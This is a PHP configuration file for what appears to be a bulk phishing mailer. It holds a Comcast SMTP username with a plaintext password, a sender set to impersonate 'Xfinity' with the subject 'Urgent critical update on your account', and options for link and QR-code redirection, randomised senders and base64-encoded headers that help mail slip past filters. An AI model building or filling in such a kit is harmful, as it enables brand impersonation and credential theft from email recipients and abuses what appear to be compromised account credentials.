<?php

// SMTP settings
$smtpSettings = [
    'smtp1' => [
        'host' => 'smtp.comcast.net',
        'port' => 587,
        'username' => 'amiand101@comcast.net',
        'password' => 'qwerty2@',
        'Hostname'			=> "mail-".rand(1,9999)."sys.comcast.net",
    ],
 
    // Add more SMTP configurations as needed
];

$commonSettings = [
    'from'              => 'xfinity.communications@comcast.net',    // Sender's email address
    'fromname'          => 'Xfinity',           // Sender's name
    'subject'           => 'Urgent critical update on your account', // Default email subject with placeholder
    'letterFile'        => '1.html',                   //  letter filename
    'priority'          => '3',                         // Priority 
    'encoding'          => 'quoted-printable',          // Encoding type
    'charset'           => 'utf-8',                    // Character set
    'threads'           => '3',                       // Number of threads
    'sleepDuration'     => '',                       // Sleep duration between sending emails
    'link'              => '',                         // Your link for muttple link sepperat with |
    'linkb64'           => '',                         // Base link link
    'qrlink'            => '',                         // Link behinde qrlink 
    'qrlabel'           => '',                         // Label below qr code
    'image_attachfile'  => '',                         // Image attachment filename
    'imageLetter'       => 'ff1.jpg',                   // Image to base64 or direct images sending
    'pdf_attachfile'    => '',                         // PDF file name to attach
    'autolink'          => false,                      // enable autolink in function
    'image_attachname'  => '',                         // CHnage attachment name
    'randomparam'       => false,                      // randomparam in front of link
    'encodeFromInfo'    => false,                       // Enable Base64 encoding for from name
    'encodeSubject'     => false,                       // Enable Base64 encoding for subject
    'randSender'        => true,                      // Enable Base64 encoding for sender's name
    'displayimage'      => false,   
    'recipientListFile' => 'list.txt',
    'ErrorHandling' => '2',  
    // Enable Base64 encoding for image display
    // other common settings...
];

$recipientListSettings = [
    'removeDuplicates' => false, // Remove duplicate recipients
    'recipientListFile' => 'list.txt', // Recipient list file
];

?>
